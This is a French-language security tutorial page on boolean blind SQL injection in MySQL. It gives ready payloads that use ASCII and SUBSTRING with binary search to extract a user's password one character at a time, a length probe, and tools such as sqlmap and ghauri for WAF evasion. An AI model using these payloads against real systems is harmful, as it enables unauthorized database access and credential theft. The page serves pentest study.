---
title: "Extraction booléenne de caractères dans l'injection aveugle MySQL"
description: "L'oracle de caractères SUBSTRING et ASCII pour l'injection SQL aveugle MySQL, extrayant les valeurs par recherche dichotomique sur les points de code."
keywords:
  - SUBSTRING
  - ASCII
  - recherche dichotomique
  - extraction aveugle
  - oracle de caractères
---

# Extraction booléenne

L'oracle de caractères lit une valeur une position à la fois. `SUBSTRING(value, pos, 1)` retourne le caractère à `pos` et `ASCII(...)` donne son point de code, qu'une comparaison transforme en un test vrai/faux que la réponse révèle.

Commencez par confirmer que l'oracle répond différemment au vrai et au faux :

```sql
' AND 1=1-- 
' AND 1=2-- 
```

Une fois une différence fiable établie, extrayez une valeur par recherche dichotomique sur chaque position. Pour le premier caractère du mot de passe du premier utilisateur :

```sql
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- 
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96-- 
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97-- 
```

Chaque test `>` divise par deux la plage de candidats, donc un caractère imprimable est cerné en environ sept requêtes. Incrémentez la position de `SUBSTRING` pour parcourir la chaîne, et arrêtez-vous quand une position retourne un point de code de zéro (plus de caractères). Déterminez d'abord la longueur pour savoir quand vous arrêter :

```sql
' AND LENGTH((SELECT password FROM users LIMIT 1))=32-- 
```

Comme cela génère de nombreuses requêtes quasi identiques, c'est presque toujours automatisé (par exemple avec Burp Intruder ou sqlmap), mais comprendre l'oracle à requête unique est ce qui vous permet de l'adapter quand un outil bloque.

## Outils

- **sqlmap** : extraction automatisée en blind booléen avec recherche dichotomique.
- **ghauri** : alternative rapide pour l'inférence booléenne avec évasion des WAF.
- **Burp Intruder** : automatiser manuellement l'oracle de caractères sur chaque position.

## Références

- MySQL Reference Manual: SUBSTRING, ASCII, LENGTH
- PortSwigger Web Security Academy: Blind SQL injection
